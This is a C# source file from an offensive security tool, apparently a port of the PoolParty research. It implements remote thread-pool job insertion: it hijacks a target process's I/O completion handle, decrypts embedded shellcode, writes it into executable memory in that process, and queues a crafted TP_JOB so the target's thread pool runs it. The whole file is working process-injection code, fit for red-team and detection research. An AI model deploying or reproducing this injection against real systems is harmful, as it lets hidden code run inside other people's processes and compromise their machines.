﻿/**
* BSD 3-Clause License

* Copyright (c) 2023-2024, SafeBreach Labs
* Copyright (c) 2025, Stroz Friedberg
* All rights reserved.

* Redistribution and use in source and binary forms, with or without
* modification, are permitted provided that the following conditions are met:
* 1. Redistributions of source code must retain the above copyright notice, this
*    list of conditions and the following disclaimer.
* 2. Redistributions in binary form must reproduce the above copyright notice,
*    this list of conditions and the following disclaimer in the documentation
*    and/or other materials provided with the distribution.
* 3. Neither the name of the copyright holder nor the names of its
*    contributors may be used to endorse or promote products derived from
*    this software without specific prior written permission.

* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
* AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
* IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
* DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
* FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
* DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
* SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
* CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
* OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
* OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
using System;
using static SharpParty.HelperFuncs;
using static SharpParty.Win32;
using static SharpParty.Structs;
using static SharpParty.Constants;
using static SharpParty.Enums;
using System.Runtime.InteropServices;

namespace SharpParty
{
    internal class RemoteTpJobInsertion
    {
        public unsafe static void Run(IntPtr tProcHandle)
        {
            IntPtr tIoCompletionHandle = HijackTargetHandle(tProcHandle, "IoCompletion");
            if (tIoCompletionHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get a handle to target process' I/O Completion Queue. PoolParty Failed.");
                return;
            }
            Console.WriteLine("[+] Got handle to target process' I/O Completion Queue - (0x{0:X16})", tIoCompletionHandle.ToInt64());

            byte[] sc = aesDecrypt(ENC_SC, Convert.FromBase64String(DEC_KEY));
            uint scSize = (uint)sc.Length;

            IntPtr scAddr = VirtualAllocEx(tProcHandle, IntPtr.Zero, scSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (scAddr == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to allocate shellcode memory.");
                int win32Err = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Win32 Error = 0x{0:X16}", win32Err);
                return;
            }
            else
            {
                Console.WriteLine("[+] Allocated shellcode memory in target process: 0x{0:X16}", scAddr.ToInt64());
            }

            IntPtr bytesWritten = IntPtr.Zero;
            bool writeRes;
            fixed (byte* p = sc)
            {
                IntPtr ptr = (IntPtr)p;
                writeRes = WriteProcessMemory(tProcHandle, scAddr, ptr, scSize, out bytesWritten);
            }

            if (!writeRes)
            {
                Console.WriteLine("[-] Failed to write shellcode to allocated memory.");
                int win32Err = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Win32 Error = 0x{0:X16}", win32Err);
                return;
            }
            Console.WriteLine("[+] Successfully wrote shellcode to allocated memory in target process. (bytesWritten = " + bytesWritten + ")");

            string jn = genRandomName(8); // Random name for job
            IntPtr hJob = CreateJobObject(IntPtr.Zero, jn);
            if (hJob == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to create job object with name: " + jn);
                return;
            }
            Console.WriteLine("[+] Created job object with name: " + jn + ", (0x{0:X16})", hJob.ToInt64());

            IntPtr pTpJob = Marshal.AllocHGlobal(sizeof(FULL_TP_JOB));
            uint allocStatus = TpAllocJobNotification(out pTpJob, hJob, scAddr, IntPtr.Zero, IntPtr.Zero);
            if (allocStatus != 0)
            {
                Console.WriteLine("[-] Failed to allocate job notification in target process. ntStatus = 0x{0:X16}", allocStatus);
                int win32Err = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Win32 Error = 0x{0:X16}", win32Err);
                Marshal.FreeHGlobal(pTpJob);
                return;
            }
            Console.WriteLine("[+] Associated crafted TP_JOB with shellcode.");

            IntPtr remoteTpJobAddr = VirtualAllocEx(tProcHandle, IntPtr.Zero, (uint)sizeof(FULL_TP_JOB), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (remoteTpJobAddr == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to allocate memory for crafted TP_JOB.");
                int win32Err = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Win32 Error = 0x{0:X16}", win32Err);
                Marshal.FreeHGlobal(pTpJob);
                return;
            }
            Console.WriteLine("[+] Allocated memory for malicious TP_JOB: 0x{0:X16}", remoteTpJobAddr.ToInt64());

            bytesWritten = IntPtr.Zero;
            bool writeJobRes = WriteProcessMemory(tProcHandle, remoteTpJobAddr, pTpJob, (uint)sizeof(FULL_TP_JOB), out bytesWritten);
            if (!writeJobRes)
            {
                Console.WriteLine("[-] Failed to write crafted TP_JOB to allocated memory.");
                int win32Err = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Win32 Error = 0x{0:X16}", win32Err);
                Marshal.FreeHGlobal(pTpJob);
                return;
            }
            Console.WriteLine("[+] Wrote the crafted TP_JOB to the allocated memory (bytesWritten = " + bytesWritten + ")");

            JOBOBJECT_ASSOCIATE_COMPLETION_PORT jobAssocCompletionPort = new JOBOBJECT_ASSOCIATE_COMPLETION_PORT();
            bool setInfo1 = SetInformationJobObject(hJob, JobObjectInfoClass.JobObjectAssociateCompletionPortInformation, &jobAssocCompletionPort, (uint)sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
            if (!setInfo1)
            {
                Console.WriteLine("[-] Failed to zero out job object's I/O Completion Queue.");
                int win32Err = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Win32 Error = 0x{0:X16}", win32Err);
                Marshal.FreeHGlobal(pTpJob);
                return;
            }
            Console.WriteLine("[+] Zero'd out job object's I/O Completion Queue.");

            jobAssocCompletionPort.CompletionKey = remoteTpJobAddr;
            jobAssocCompletionPort.CompletionPort = tIoCompletionHandle;
            bool setInfo2 = SetInformationJobObject(hJob, JobObjectInfoClass.JobObjectAssociateCompletionPortInformation, &jobAssocCompletionPort, (uint)sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
            if (!setInfo2)
            {
                Console.WriteLine("[-] Failed to associate target process' I/O Completion Queue with malicious TP_JOB.");
                int win32Err = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Win32 Error = 0x{0:X16}", win32Err);
                Marshal.FreeHGlobal(pTpJob);
                return;
            }
            Console.WriteLine("[+] Associated target process' I/O Completion Queue with malicious TP_JOB.");

            bool assignRes = AssignProcessToJobObject(hJob, GetCurrentProcess());
            if (!assignRes)
            {
                Console.WriteLine("[-] Failed to assign current process to job object (" + jn + ") to queue packet to I/O Completion Queue of target process.");
                int win32Err = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Win32 Error = 0x{0:X16}", win32Err);
                Marshal.FreeHGlobal(pTpJob);
                return;
            }
            Marshal.FreeHGlobal(pTpJob);
            Console.WriteLine("[+] Assigned current process to crafted TP_JOB, queueing a packet to I/O Completion Queue of target process. PoolParty Success!");
        }
    }
}
